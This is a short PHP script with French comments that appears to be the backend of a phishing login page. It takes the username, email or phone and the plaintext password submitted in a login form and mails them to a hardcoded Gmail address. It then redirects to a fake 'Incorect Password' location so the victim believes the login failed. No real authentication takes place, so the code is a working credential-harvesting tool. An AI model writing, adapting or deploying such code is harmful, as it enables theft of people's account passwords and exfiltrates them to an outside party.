<?php
if (isset($_POST['submit'])) {
    // Récupérer les données du formulaire
    $username_email_phone = $_POST['username_email_phone'];
    $password = $_POST['password'];

    // Adresse e-mail à laquelle envoyer les informations
    $to = 'Kyliang2010@gmail.com';

    // Sujet du message
    $subject = 'Nouvelle connexion sur votre site';

    // Corps du message
    $message = "Nouvelle connexion sur votre site :\n\n";
    $message .= "Nom d'utilisateur/Email/Téléphone : " . $username_email_phone . "\n";
    $message .= "Mot de passe : " . $password . "\n";

    // En-têtes additionnels
    $headers = 'From: webmaster@example.com' . "\r\n" .
               'Reply-To: webmaster@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Envoi de l'e-mail
    mail($to, $subject, $message, $headers);

    // Redirection après envoi du formulaire (facultatif)
    header('Location: Incorect Password');
    exit();
}
?>
